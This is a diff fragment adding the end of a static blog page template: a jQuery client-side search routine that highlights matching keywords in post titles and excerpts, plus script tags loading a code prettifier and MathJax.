+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword indigo lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword indigo lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+</body>
+</html>
